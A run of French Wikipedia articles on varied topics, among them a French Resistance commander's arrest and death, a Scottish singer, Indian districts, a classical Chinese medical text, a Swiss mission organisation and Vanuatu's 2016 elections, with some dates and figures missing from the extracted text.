Le maquis de Malleval est attaqué le 29 janvier 1944 par les Allemands qui traquent les insurgés dans les moindres recoins, allant jusqu’à fusiller des civils et incendier des bâtiments. Une quarantaine de victimes, tuées ou déportées, est déplorée. Six mois avant la grande offensive du Vercors, l’armée nazie fait la démonstration de ses méthodes et de son acharnement sur les populations suspectées d’aider les résistants. C’est un coup très dur pour Albert ; il perd en effet de nombreux hommes dont il avait la responsabilité et fait face à l’échec de la recréation du bataillon.
De l’AS aux Forces françaises de l’intérieur (FFI).
Après la dispersion de Malleval, Roland continue d’animer les différents maquis du département, se déplaçant souvent avec son petit état-major. Il reçoit également de nombreux correspondants au sein de l’hôtel de la Division à Grenoble. Il parvient ainsi à mettre en place un réel maillage du territoire en structurant les relations entre les secteurs sans nier la part d’indépendance de chacun ; il réalise au niveau local les unions obtenues au niveau national. Il s’emploie à leur procurer des armes et à améliorer leur formation militaire. Le CDLN lui confie en février 1944 la tête de toutes les forces combattantes du département, sous le nom de Forces françaises de l’intérieur (FFI), selon le concept créé par le Comité français de libération nationale à Alger. Roland devient alors « Sylvain ».
Sylvain poursuit cependant l’action engagée sous le nom de Roland : il garde toujours un œil attentif sur la reformation future du BCA et envoie le capitaine Tanant, « Laroche », préparer la réinstallation au milieu du Vercors du noyau réchappé de Malleval. 
L’organisation du département se poursuit, ainsi que la liaison avec le CDLN. Il s’agit de préparer les maquisards jusqu’à ce qu’ils soient prêts pour un combat d’ampleur, en synchronisation avec le débarquement de Provence. Il faut en même temps composer avec le désir d’action immédiate et les stratégies de harcèlement préconisées par différentes tendances de la Résistance.
Devant le danger Sylvain quitte Seyssins et se fait héberger chez un ami à Grenoble. Il poursuit sa tâche, qui le mène le 2 mai 1944 dans le massif de Belledonne à la rencontre de la compagnie Stéphane. Le 5 mai, il décline aux différents secteurs les directives reçues d’Alger.
La dénonciation.
Le 6 mai 1944, le chef de bataillon Albert de Seguin de Reyniès quitte le domicile de la famille Regard qui l’hébergeait pour aller chercher son courrier à l’hôtel de la Division. Ses visites régulières place Verdun ont été signalées par René Tirolle, un ancien du BCA devenu milicien, qui conduit la filature de Reyniès. À 9h30, Albert retrouve le capitaine Hirschauer au Jardin de ville, puis se rend à son ancienne adresse. C’est en ressortant par le côté que longe la rue de Beylié qu’il est appréhendé par les hommes de la Sipo-SD. Il est mené au siège de l’organisation, dans l’hôtel Gambetta. De cette arrestation d’abord rien ne filtre. Hirschauer est le premier à s’en inquiéter, car ils devaient se retrouver à midi. Au fur et à mesure des rendez-vous manqués, l’ensemble de son réseau et de sa famille s’inquiète de plus en plus.
Mais devant l’évidence de la disparition, des mesures urgentes s’imposent : le département ne peut se passer d’un chef, aussi le 14 mai le capitaine Alain le Ray, « Bastide », premier chef militaire du Vercors, est appelé à la tête des FFI. Dans le Vercors, le noyau du futur bataillon est rattaché à l’ensemble des maquis du massif. Sous la conduite de Abel Chabal (nommé à la tête du groupe lorsque de Reyniès prend ses fonctions aux FFI), les chasseurs auront une conduite exemplaire lors de l’assaut du plateau, causant d’importantes pertes aux Allemands, jusqu’aux terribles combats de Valchevrière. Ils ont lutté sous les écussons du BCA grâce à la recréation officialisée peu avant par le commandant militaire du maquis.
Quatre mois s’écoulent, au cours desquels les hommes entraînés grâce à l’organisation mise en place par de Reyniès combattent et au terme desquels les Alliés arrivent à Grenoble. En juin, Henriette tente une démarche auprès de la prison de Montluc à Lyon, sans succès. Au début du mois d’août le 07/08/1944, le délateur est exécuté par la Résistance. La libération de Grenoble, le 22 août, permet de lever une part du mystère : des rapports de l’interrogatoire d’Albert sont retrouvés dans les archives de la Sipo SD. Les rapports révèlent qu’Albert n’a livré aucune information utile à l’ennemi, malgré un interrogatoire de plus de cinq heures. Dans une première phase d’entretien, le commandant s’en tient à des données biographiques, il met l’accent sur sa participation à la Grande Guerre et ses séjours en Allemagne. Il reconnait avoir commandé le BCA. Les interrogateurs s’intéressent ensuite à sa dernière nuit, si les rapports diffèrent dans la formulation ils révèlent tous que de Reyniès a refusé de répondre. À la fin des rapports se trouve la réponse à quatre mois d’angoisse : "« Vers 24 heures, un employé de la prison annonçait qu’il l’avait trouvé mort dans la cellule »". Son corps n’a jamais été retrouvé.
Distinctions.
Hommages.
Après la libération du territoire commence un vaste chantier administratif visant à reconnaitre officiellement les fonctions tenues en France dans la clandestinité. Le dossier de de Reyniès est étudié pour aboutir à la conclusion qu’il a exercé un commandement du niveau d’un lieutenant-colonel. Le 21 novembre 1945, ce grade lui est accordé à titre posthume.
À défaut de sépulture, des cénotaphes et plaques permettent de rappeler la mémoire du lieutenant-colonel en des lieux éminemment symboliques :

</doc>
<doc id="9622651" url="https://fr.wikipedia.org/wiki?curid=9622651" title="Barbara Dickson">
Barbara Dickson

Barbara Dickson (née le à Dunfermline) est une chanteuse écossaise.
Elle a eu 15 albums dans les charts britanniques depuis 1977, ainsi que de nombreux singles atteignant le Top 20 britannique.
Biographie.
Elle a appris le piano à 5 ans, et la guitare à 12 ans.
Elle a enregistré entre autres "Anyone Who Had a Heart", a joué dans les comédies musicales "Blood Brothers", "Evita" ou "Chess", et a interprété certaines chansons de Jacques Brel.
Nominations et récompenses.
Elle a remporté le Laurence Olivier Award en 2000 pour son rôle dans la comédie musicale britannique "Spend Spend Spend".

</doc>
<doc id="9622652" url="https://fr.wikipedia.org/wiki?curid=9622652" title="Simplastrea vesicularis">
Simplastrea vesicularis

Simplastrea vesicularis est une espèce de coraux de la famille des Oculinidae (selon "ITIS") ou de la famille des Euphylliidae (selon "WoRMS").

</doc>
<doc id="9622659" url="https://fr.wikipedia.org/wiki?curid=9622659" title="District de Madhubani">
District de Madhubani

Le est un district de l'état du Bihar, en Inde.
Géographie.
Au recensement de 2011, sa population compte habitants.
Son chef-lieu est la ville de Madhubani. 

</doc>
<doc id="9622678" url="https://fr.wikipedia.org/wiki?curid=9622678" title="Åländsk Center">
Åländsk Center



</doc>
<doc id="9622680" url="https://fr.wikipedia.org/wiki?curid=9622680" title="Aéroport de Zweibrücken">
Aéroport de Zweibrücken



</doc>
<doc id="9622683" url="https://fr.wikipedia.org/wiki?curid=9622683" title="Destiny (album de Saxon)">
Destiny (album de Saxon)

 est le neuvième album studio du groupe britannique Saxon, sorti le .
Si "Rock the Nations" avait été mal accueilli dès sa sortie, que dire de ce "Destiny", heureusement non tragique
pour la suite de la carrière du groupe, mais une orientation musicale progressivement abandonnée pour les productions futures...

</doc>
<doc id="9622687" url="https://fr.wikipedia.org/wiki?curid=9622687" title="District de Jamui">
District de Jamui

Le est un district de l'état du Bihar, en Inde.
Géographie.
Au recensement de 2011, sa population compte habitants.
Son chef-lieu est la ville de Jamui. 

</doc>
<doc id="9622696" url="https://fr.wikipedia.org/wiki?curid=9622696" title="Collège Saint-Joseph de Lille">
Collège Saint-Joseph de Lille

Le collège Saint-Joseph est une ancienne institution jésuite d'enseignement secondaire catholique pour garçons avec externat et internat, sise à Lille dans le Nord. Fondé par les jésuites en 1876, le collège préparait au baccalauréat suivant un parcours classique d'humanités gréco-latines. Des classes préparatoires aux grandes écoles étaient ouvertes avec une classe de réputée. 
Le collège Saint-Joseph a cessé d'exister en tant que tel quatre-vingt-douze ans plus tard en pour constituer le Centre Scolaire Saint-Paul avec deux autres écoles lilloises, l'Institution pour garçons Jeanne d'Arc et l'Institution pour filles des Sœurs du Sacré-Cœur. Cet ensemble est désormais un établissement mixte pour filles et garçons.
Le bâtiment sert aujourd'hui au collège Saint-Paul.
Historique.
Les jésuites sont arrivés à Lille en 1562 et construisent un collège (leur ancienne chapelle est aujourd'hui l'église Saint-Étienne de Lille). Les jésuites sont expulsés du royaume de France en 1765, puis la Compagnie de Jésus est dissoute. Il faut donc attendre un peu plus d'un siècle pour leur retour à Lille.
Le nouveau collège des jésuites, situé rue Solférino, est placé sous la protection de saint Joseph. L'architecte de l'ensemble est Auguste Mourcou, auteur de nombreux projets à Lille et dans la région, dont l'hôpital Sainte-Eugénie de Lille. Les élèves du collège Saint-Joseph portent au début un uniforme.&lt;br&gt; La chapelle du collège est construite en 1886-1887*.&lt;br&gt;L'établissement scolaire est agrandi en 1964 avec un bâtiment moderne construit en enfilade donnant sur la rue Solférino et le boulevard Vauban. Le nouveau bâtiment est béni par Fabre, directeur de l'enseignement diocésain, en présence de nombreuses personnalités, dont le R.P. Dubromelle sj, directeur de l'établissement. Le collège cesse d'exister en tant que tel en 1968.
Le bâtiment sert aujourd'hui au collège Saint-Paul.
Personnalités.
Parmi les anciens élèves du collège on compte :

</doc>
<doc id="9622702" url="https://fr.wikipedia.org/wiki?curid=9622702" title="Guilford (Vermont)">
Guilford (Vermont)

Guilford est une ville du comté de Windham dans l'état du Vermont aux États-Unis.
La population était de en 2010.

</doc>
<doc id="9622705" url="https://fr.wikipedia.org/wiki?curid=9622705" title="Guildford (homonymie)">
Guildford (homonymie)



</doc>
<doc id="9622723" url="https://fr.wikipedia.org/wiki?curid=9622723" title="Blastotrochus nutrix">
Blastotrochus nutrix

Blastotrochus nutrix est une espèce de coraux appartenant à la famille des Flabellidae.

</doc>
<doc id="9622724" url="https://fr.wikipedia.org/wiki?curid=9622724" title="Vestibule vulvaire">
Vestibule vulvaire

Le vestibule vulvaire (ou vestibule de la vulve, canal vulvaire, espace inter-labial) est la partie de la vulve située entre les petites lèvres comprenant le méat urétral "(ou ostium externe de l'urètre)" et l’entrée du vagin. Son bord est marqué par la . Il représente l'extrémité inférieure du du stade embryonnaire. 
Il se compose de deux parties de forme triangulaire : 
Structures.
L'urètre féminin, le vagin, les glandes de Bartholin et les glandes de Skene s'ouvrent dans le vestibule.
L'orifice urétral externe ("orificium urethræ externum" ; méat urétral) se situe environ 28,5 mm sous le gland du clitoris ( et immédiatement au-dessus du vagin ; il a généralement la forme d’une courte fente sagittale avec des côtés légèrement surélevés. À proximité se trouvent les ouvertures des glandes de Skene.
L’orifice vaginal est une fente médiane située en dessous et derrière l’ouverture de l'urètre ; sa taille est inversement proportionnelle à celle de l’hymen.
Les petites lèvres se situent à gauche et à droite du vestibule.
À son sommet se trouvent le capuchon du clitoris, le frein clitoridien, et le gland du clitoris. À sa base, la commissure postérieure des petites lèvres et le périnée.
La ligne de Hart borde latéralement la région et marque le changement de la peau vulvaire en la peau lisse de la vulve.
Pathologie.
La douleur associée au vestibule vulvaire est relativement fréquente. Selon , environ 28 % des femmes ont connu une douleur vestibulaire, dont environ 8 % au cours des six derniers mois.

</doc>
<doc id="9622734" url="https://fr.wikipedia.org/wiki?curid=9622734" title="Carlo Strenger">
Carlo Strenger

Carlo Strenger, né le à Bâle et mort le à Tel-Aviv, de nationalités suisse et israélienne, est un essayiste, professeur de psychologie et de philosophie, écrivain, chroniqueur, membre du Séminaire de psychanalyse existentielle de Zurich ; il fait aussi partie du comité d'observation du terrorisme au sein de la Fédération mondiale des scientifiques.
Biographie.
Carlo Strenger a grandi dans une famille juive orthodoxe. Après être passé du judaïsme orthodoxe à l’athéisme laïque, ce qu’il considère rétrospectivement comme l’expérience déterminante de sa vie, Strenger a vécu un an en Israël. Il a ensuite fait des études de psychologie et de philosophie à Zurich et a été habilité comme professeur à la suite de son doctorat à l’université hébraïque de Jérusalem en 1989. 
Il a commencé une carrière d’enseignant à l’université de Tel Aviv, où il occupe une chaire en 2015. Carlo Strenger siège en outre au conseil scientifique de la Fondation Sigmund-Freud à Vienne, il est "" au de la City University de New York, boursier du Collège scientifique de Berlin et membre du Séminaire de psychanalyse existentielle de Zurich. Il publie des articles sur les politiques israélienne et européenne dans le conflit au Moyen-Orient et sur des sujets culturels, notamment pour le journal israélien "Haaretz", le journal suisse "Neue Zürcher Zeitung" ou le "The Guardian". 
Il se définit comme un mais n'a jamais hésité à faire preuve de critique à son égard lorsqu'il le jugeait nécessaire. 
Polyglotte, il s'exprime aussi bien en allemand, en anglais qu'en français ou en hébreu.
Sa femme est Julia Elad-Strenger, professeur et psychologue politique.
Psychanalyse.
La psychanalyse fut le premier terrain d’études de Strenger. Sa perspective s’inscrit dans une démarche interdisciplinaire croisant la pratique psychanalytique avec les recherches en sociologie, en économie et en neurosciences. Dans son livre "", devenu un best-seller il a développé une nouvelle approche théorique et clinique montrant que les rapides transformations culturelles, sociales et économiques de ces dernières décennies ont conduit à de nouvelles constellations psychodynamiques qui diffèrent beaucoup des modèles psychanalytiques antérieurs. Strenger est considéré par certains critiques comme l’un des théoriciens les plus créatifs de la psychanalyse moderne.
Mondialisation.
À partir de 2000, Carlo Strenger explore l’influence de la mondialisation sur le psychisme individuel, la culture et la politique. Dans son ouvrage "", il s’intéresse aux générations qui grandissent dans une réalité globalisée et montre comment, parce qu’elles sont beaucoup plus influencées par les médias contemporains que par l’histoire et les traditions, elles souffrent souvent d’un syndrome de désorientation. Il a élargi ce modèle dans son livre "La peur de l’insignifiance nous rend fous", traduit dans de nombreuses langues. Il y explique que l’humanité a engendré une nouvelle mutation - il l’appelle Homo globalis - définie par une relation très intense avec l’infodivertissement via le Net. 
Il porte un regard critique sur les mythes du capitalisme mondial, principalement sur l’idée que tout est faisable, symbolisée par le célèbre slogan publicitaire : « Just Do It ! ». À l’aide de données cliniques, sociologiques et économiques, il explique comment ce cadre de référence global rend très difficile pour Homo globalis de développer une estime de soi stable, en conséquence de quoi celui-ci souffre d’une peur accrue de l’insignifiance. Dans "", il développe la pertinence clinique de ce modèle en recourant à des études de cas détaillées.
Politique israélienne et conflit au Moyen-Orient.
Carlo Strenger travaille comme journaliste politique à partir de 1997. Il écrit régulièrement des articles depuis 2007 pour le grand journal libéral de gauche israélien "Haaretz", mais aussi pour le journal suisse "Neue Zürcher Zeitung" depuis 2012 et ponctuellement pour "The Guardian". 
Le journaliste de "Die Zeit", Jörg Lau, a dit de lui qu’il était « l’une des voix les plus avisées de la gauche israélienne ». Strenger critique la politique de colonisation d'Israël, qu’il considère comme un grand péril, autant moral que politique, pour l’avenir de ce pays. Mais Strenger critique aussi la condamnation unilatérale d’Israël, notamment venant de gauche. Il insiste sur le fait que ces condamnations nient purement et simplement la complexité du conflit au Moyen-Orient. 
Il a longtemps été partisan d’une solution à deux États dans le conflit israélo-palestinien, mais depuis 2011 il ne cache pas son pessimisme, et se demande si cette solution est toujours réalisable vu le virage à droite de la politique israélienne et la faiblesse de la direction palestinienne. Le livre de Strenger "" ["Israël : un pays difficile"] a été considéré dans un article du journal "Die Zeit" comme « l’un des livres les plus importants parus ces dernières années sur Israël », livre qui a contribué à sa célébrité et à sa réputation d'. Strenger y montre qu’Israël est pris dans une bataille culturelle autour de l’identité du pays, où les forces libérales de gauche et laïques, qui dominent l’économie et la culture, se retrouvent aujourd’hui en minorité. Il explique en outre à quel point les forces ultra-orthodoxes, nationalistes de droite et nationalistes religieuses réunies dans une coalition anti-libérale modifient profondément le caractère d’Israël.
Philosophie politique.
Dans "La peur de l’insignifiance nous rend fous", Carlo Strenger démontrait déjà que la culture occidentale est profondément affaiblie par des tendances relativistes qui rendent impossible la défense de ses valeurs. Il plaidait pour un retour aux valeurs des Lumières. Dans "" ("Le Mépris civilisé. Pour la défense de notre liberté"), selon Pierre Deshusses dans "Le Monde", Strenger fait valoir que l’idéologie du politiquement correct, bien qu’initiée avec de bonnes intentions, est contre-productive dans la mesure où elle a contribué à rendre illégitime toute forme critique, sauf celle de notre propre culture. Quand une grande partie de la gauche et des libéraux est pour ainsi dire paralysée par la logique du politiquement correct, d’aucuns comme Marine Le Pen et des mouvements comme Pegida, sous couvert de reprendre le flambeau de la défense de l’Occident, ne font qu’enterrer les valeurs de liberté qu’ils prétendent défendre. 
Carlo Strenger propose comme solution de remplacement au politiquement correct l’attitude du « mépris civilisé » qui remet au goût du jour le principe de tolérance hérité des Lumières : au lieu de respecter aveuglément toutes les formes de croyance et tous les modes de vie, il faudrait garder à l’esprit que rien ni personne ne devrait être à l’abri d’une critique solidement fondée.

</doc>
<doc id="9622739" url="https://fr.wikipedia.org/wiki?curid=9622739" title="Farciot Edouart">
Farciot Edouart

Farciot Edouart (ASC), de son vrai nom Alexander Edouart Farciot, est un spécialiste des effets spéciaux américain né le à Los Angeles (Californie) et mort le à Kenwood (Californie).
Biographie.
Farciot Edouart commence à travailler comme assistant cameraman pour RealArt Pictures, puis en 1922 il entre chez Jesse L. Lasky Feature Play Company. Chez Paramount Pictures, il se spécialise dans les effets spéciaux visuels, et devient un des pionniers de la technique de la projection arrière.
Notes et références.
 Base de données officielle des Oscars

</doc>
<doc id="9622744" url="https://fr.wikipedia.org/wiki?curid=9622744" title="Shanghan Lun">
Shanghan Lun

Rédigé au début du par Zhang Zhongjing (25 – 220), le Shanghan Lun ( fait partie des quatre classiques fondamentaux de la médecine chinoise ("Neijing", "Shanghan Lun", "Jinggui" "yaolüe" et "Shennong bencao jing"). Il est considéré comme la première grande référence en matière de médecine clinique. De tous les ouvrages de médecine chinoise, il est celui qui a fait l’objet des commentaires les plus nombreux. Il est encore aujourd’hui le texte le plus soumis aux travaux de recherches partout dans le monde, notamment au Japon, aux États-Unis, en Australie, à Singapour, en Russie, en France et en Suisse.
Le "Shanghan lun" () faisait originellement partie (comme le "Jingui yaolüe") d’un ouvrage source perdu peu après sa rédaction vers 200, le "Shanghan zabing lun" () [Traité des attaques du Froid et de diverses maladies]. Il a posé les bases de la manière dont la Médecine chinoise a évolué jusqu’à nos jours.
Conception et histoire de l'ouvrage.
Zhang Ji (), plus connu sous le nom de Zhang Zhongjing (), serait né entre 142 et 152 à Nieyang (aujourd’hui Nanyang), dans la province du Henan. On ne connaît que peu de d’éléments de sa vie, Seuls des récits au caractère hagiographique, le décrivant comme l’archétype du médecin aux capacités extraordinaires de diagnostic et de pronostic, nous ont été transmis au cours des siècles.
Selon la légende, ce serait l’accroissement des épidémies dû aux insurrections paysannes et aux ravages des conflits entre chefs d’armées rivaux, survenus durant cette période de fin de règne qui l’aurait incité à étudier la médecine avec énergie et détermination. D’après l’auto-préface attribuée à Zhang Zhongjing, ce sont ces événements qui l’amenèrent à rédiger, en s’appuyant sur des traités pratiques et des textes plus théoriques, comme le "Neijing" ou le "Nanjing", le "Shanghan zabing lun" [Traité des attaques du Froid et de diverses maladies].
Ne parvenant pas à traverser, sans dommage, les perturbations de la période des Trois Royaumes (220-265), le "Shanghan zabing lun" disparaît sous sa forme initiale, peu de temps après la mort de Zhang Zhongjing. Néanmoins, grâce à des fragments du texte retrouvés, moins d’un demi-siècle plus tard par Wang Shuhe (210-285), un fonctionnaire de l’Académie impériale de médecine, une version a pu parvenir jusqu’à nous. Après avoir collectée et réorganisée la partie dont il disposait en fonction de sa compréhension, il donna naissance à la première version connue sous le titre de "Shanghan Lun". Cependant, faute d’avoir été publiées officiellement, seules des copies circulèrent de main en main pendant les siècles qui suivirent, et il faudra attendre le avant de retrouver des références au "Shanghan Lun" dans les neuvième et dixième rouleaux du "Beiji qianjin yaofang" () [Prescriptions essentielles d’urgence valant mille onces d’or] rédigé par Sun Simiao. Mais ce n’est qu’après avoir récupéré d’autres éléments complémentaires à la fin de sa vie que Sun Simiao rédigera, dans les neuvième et dixième rouleaux de son autre ouvrage le "Qianjin yifang" () [Supplément aux prescriptions valant mille onces d’or], ce qui sera considéré comme la version la plus ancienne du "Shanghan Lun" que nous connaissons et qui nous soit parvenue aujourd’hui. 
Peu de temps après, une autre compilation des Tang vit le jour, le "Waitai miyao" () [Documents classés
d’un fonctionnaire], rédigé en 752 par un officiel, Wang Tao (702 ? -772). Cette compilation, qui contient de nombreux fragments d’œuvres antérieures aujourd’hui disparues, recèle de nombreux passages citant Zhang Zhongjing.
Sous les Song, avec la création du "Jiaozheng yishuju" () [bureau des publications médicales révisés] "et le développement de l’imprimerie, la reproduction et la diffusion de nombreux textes médicaux comme "le "Jingui yaolüe fanglun", le "Neijing", le "Shanghanlun", etc., est favorisé. 
La première édition imprimée, sous la direction de l’érudit Lin Yi, voit le jour sous les Song du Nord en 1065. Cette première édition, principalement fondée sur le texte de Wang Shuhe, est communément nommée le "Songban shanghanlun" (). Cependant, faute d’avoir été conservée, cette version nous est parvenue grâce à l’édition de Zhao Kaimei imprimée en 1599. Il faut mentionner l’existence d’une édition japonaise antérieure à celle des Song qui sera à l’origine de nombreux commentaires japonais. Connue sous le nom de "Kangping shanghanlun" () [Édition de Kangping du traité des attaques du Froid], cette édition restera inconnue des médecins chinois pendant des siècles.
Les commentateurs du "Shanghan Lun".
L’exégèse qui entoure le "Shanghan Lun" est extrêmement abondante. On considère qu’il y aurait plus de cinq cents commentateurs de ce texte ; les plus célèbres étant Cheng Wuji, Fang Youzhi, Ke Qin, You Zaijing. Parmi les éditions commentés les plus connues, citons : le "Zhujie shanghanlun" () [Traité des attaques du Froid annoté] publié en 1144 par Cheng Wuji ; le "Shanghanlun tiaobian" () [Analyse détaillée du "Shanghanlun"] de Fang Youzhi, édité en 1589 ; le "Shanghan laisu ji" () [Compilation pour faire revivre (le Traité) des attaques du Froid], rédigé en 1669, dans lequel son auteur, Ke Qin, réunit les formules par familles, au lieu de suivre linéairement le texte. Mentionnons également le "Shanghan guanzhu ji" () [Compilation en enfilage de perles (du traité) des attaques du Froid] publié en 1729 par You Zaijing, organisé selon les méthodes thérapeutiques.
Analyse du contenu.
Le fondement historique du "Shanghan Lun" et les théories concernant sa structure sont sujets à controverses. L’organisation générale du texte nous provient du remaniement de Wang Shuhe et sa division en six états pathologiques (maladie "taiyang," maladie "yangming," maladie "shaoyang," maladie "taiyin," maladie
"shaoyin," et maladie "jueyin") semble émaner du "Suwen". Elle suit la dialectique générale du Yin/Yang à travers trois niveaux de Yang et trois niveaux de Yin avec, pour chacun d’entre eux, une subdivision en de nombreux tableaux cliniques débouchant, généralement, sur une prescription spécifique. L’ensemble du traité contient 398 articles et 113 formules liés à des syndromes spécifiques. En outre, il est important de souligner que, malgré son titre, le « Traité des attaques du Froid » est loin d’être exclusivement consacré aux maladies générées par le Froid externe et que ses tableaux cliniques sont largement utilisés dans le traitement des maladies courantes (pneumologiques, gastroentérologiques, gynécologiques, neurologiques, auto-immunes, psychiatriques, dermatologiques, endocriniennes, etc.), que celle-ci soient aiguës ou chroniques, d’origine externe ou interne.

</doc>
<doc id="9622745" url="https://fr.wikipedia.org/wiki?curid=9622745" title="Mission 21">
Mission 21

Mission 21 - Mission protestante de Bâle est une organisation ecclésiale internationale missionnaire basée à Bâle, en Suisse. Bien que soutenue par l'Église évangélique réformée de Suisse (et la Direction du développement et de la coopération), elle est à la fois œcuménique et inter-religieuse. Elle œuvre en partenariat avec la Mission Bethléem d'Immensee et l"'Evangelische Mission in Solidarität" "(EMS)" d'Allemagne. 
Le logo de Mission 21, conçu par le graphiste Vischer Vettiger, représente de manière stylisée l'arbre de la vie décrit dans le livre de l'Apocalypse, chapitre 22, verset 2. 
Histoire.
Le , cinq organismes missionnaires ont formé ensemble « Mission 21 - Mission protestante de Bâle ». Le plus ancien d’entre eux était la Mission de Bâle, fondée en 1815. Le synode est l'organe décisionnel suprême de l'organisation. Les Églises et organisations partenaires en Afrique, en Asie, en Amérique latine et l'Europe y sont représentées en nombre égal. Le premier synode de Mission 21 a eu lieu du 16 au à Bâle. Le second a eu lieu en 2007 à Berne, le troisième en 2010 à Zurich et le quatrième en 2013 à Saint-Gall.
Objectifs et principes.
Mission 21 s’est fixé pour objectif de permettre une rencontre avec des espaces lointains et jusque-là étrangers, pour apporter une aide concrète lorsque la paix, la justice ou l'intégrité de la création y sont menacées. Elle milite dans des réunions et des séries de rencontres autour d'événements traitant des enjeux actuels de l’Église et de la société et elle fournit des espaces pour des rencontres interculturelles et interreligieuses particulièrement en Suisse. Tous les trois ans, le synode de Mission 21 choisit des thèmes qui seront particulièrement mis en avant dans la communication et le travail de Mission 21 au cours d'une période de temps. Cela peut être un effort particulier sur un pays comme sur un projet donné. Les domaines d’intervention de Mission 21 comprennent les soins médicaux, la prévention du VIH/SIDA, la formation agricole et professionnelle, le soutien aux orphelins, la formation théologique, la promotion de la paix et de l'égalité des sexes. Les quelque 100 projets sont répartis dans 17 pays en Afrique, en Asie et en Amérique latine. Le thème retenu par le synode 2010 est : « Eau de la Vie - Le droit jaillisse comme les eaux, et comme un torrent intarissable » (phrase inspirée du livre du prophète Amos, chapitre 5, verset 24). 
Gestion.
Le siège de l'association est la Maison des missions, située au 21, rue des Missions et bâtie en 1870 à Bâle comme centre de formation pour les missionnaires de la Mission de Bâle. La maison fonctionne actuellement comme un hôtel et un centre de formation. Cinquante personnes travaillent au siège de l’organisation, assistées d’une vingtaine de personnes détachées par les associations partenaires. Le siège de Mission 21 dispose une bibliothèque accessible au public, qui est aussi une bibliothèque de référence pour les questions missionnaires, œcuméniques et de travail de développement économique. Des archives très riches sont également accessibles pour la recherche interdisciplinaire particulièrement dans le domaine des études africaines elles permettent de travailler à un bilan critique de l’histoire des missions. L'association est financée par des dons privés, par les contributions des Églises et congrégations cantonales en Suisse, la Mission évangélique d’Allemagne de l'Ouest ainsi que par les contributions de diverses autres organisations. Le chiffre d'affaires total actuel de l'organisation est d’environ 13,5 millions de francs suisses par an. 
Le programme « PEP ».
PEP! (Professionals Exposure Program) est un programme de formation continue de Mission 21. Son but est de fournir aux jeunes un accès à des travaux de développement modernes, sans qu’ils doivent s’y engager pour plusieurs années. Le programme se déroule en trois parties : une formation préparatoire, puis un engagement dans un projet de six à douze mois en Afrique, en Amérique latine ou en Asie avec de véritables responsabilités et, pour finir, un séminaire de fin de formation avec un atelier pour approfondir les questions interculturelles. Le travail dans le projet est basé sur les compétences professionnelles du stagiaire; la formation lui permet donc d’améliorer ses compétences initiales tout en y ajoutant des compétences interculturelles. Chaque année, 15 à 20 personnes suivent un « PEP » - ils sont sélectionnés parmi environ 400 candidats. 
Publications.
L'association utilise trois publications destinées à ses membres et au public pour les informer de du travail et des projets de Mission 21 et de ses organisations partenaires, mais aussi pour stimuler les discussions sur des sujets d'actualité. Ces publications suivantes paraissent six fois par an : 
Églises et organisations partenaires.
La participation des Églises et des organisations partenaires joue un rôle central. Dans les rencontres continentales de partenaire Églises, les délégués respectifs sont déterminés puis définissent les enjeux actuels et coordonnent les diverses activités. Ce partenaire Églises sont : 

</doc>
<doc id="9622749" url="https://fr.wikipedia.org/wiki?curid=9622749" title="Sajlovo">
Sajlovo

Sajlovo (en serbe cyrillique : ), également connu sous le nom de Donje Sajlovo (), est un quartier de la ville de Novi Sad, la capitale de la province autonome de Voïvodine, en Serbie.
Localisation.
Au nord-est, Sajlovo est délimité par le "Rumenački put" (la « route de Rumenka »), au sud-est par la rue "Donje Sajlovo" et à l'ouest par la limite de la zone urbaine de Novi Sad.
Le quartier est entouré par ceux du Novo groblje (le « nouveau cimetière ») et de Jugovićevo au sud-est, par la Zone industrielle Sud au nord-est, par le bidonville de Bangladeš et la localité de Rumenka au nord-ouest et par la localité de Veternik au sud-ouest.
Sur le plan administratif, Sajlovo fait partie de la communauté locale de Jugovićevo.
Histoire.
Une charte du roi de Hongrie Béla IV datant de 1237 mentionne deux villages portant le nom de Sajlovo : Gornje Sajlovo ou Sajlovo I (aujourd'hui Gornje livade dans la communauté locale de Klisa) et Donje Sajlovo ou Sajlovo II (dans l'actuel secteur de Sajlovo). Le nom original de ces villages étaient « Isailovo », renvoyant au nom du moine Isaija venu d'un monastère situé à l'est de Rumenka. La dénomination du village montrerait qu'il était à l'origine peuplé par des Slaves. Après les guerres turco-hongroises du , Sajlovo n'est plus mentionné.
Le quartier actuel a été urbanisé dans la seconde moitié du le long du "Rumenački put" (la « route de Rumenka ») et a accueilli des réfugiés des pays l'ex-Yougoslavie fuyant les guerres. Selon les anciens plans d'urbanisme de Novi Sad, le secteur devait constituer une des ceintures vertes de la ville ; aujourd'hui le plan général d'urbanisme à l'horizon 2021 prévoit d'en faire un quartier dominé par les constructions individuelles.

</doc>
<doc id="9622755" url="https://fr.wikipedia.org/wiki?curid=9622755" title="Élections législatives vanuataises de 2016">
Élections législatives vanuataises de 2016

Des élections législatives se tiennent au Vanuatu le . Il s'agit de renouveler l'ensemble des cinquante-deux sièges du Parlement (monocaméral), au suffrage universel direct. Ce sont des élections anticipées, le Parlement élu en octobre 2012 avec un mandat de quatre ans ayant été dissous par le président de la République, Baldwin Lonsdale, en , à la suite de la condamnation de quinze députés pour corruption.
Le , la nouvelle assemblée porte Charlot Salwai du parti de centre-droit Réunification des mouvements pour le changement à la tête d'un large gouvernement de coalition.
Contexte.
La législature 2012-2015 a vu se succéder plusieurs gouvernements. Le Parlement élu en 2012 confie initialement à Sato Kilman (Parti progressiste populaire), le premier ministre sortant, la tâche de former un gouvernement. Le , toutefois, une majorité alternative s'impose. Kilman est contraint de démissionner ; Moana Carcasses Kalosil (Confédération Les Verts Vanouatou) devient premier ministre. Le , le Parlement démet Carcasses, et le remplace par Joe Natuman (Vanua'aku Pati). Le , Kilman parvient à constituer une majorité au Parlement pour contraindre Natuman à la démission, et reprend la tête du gouvernement.
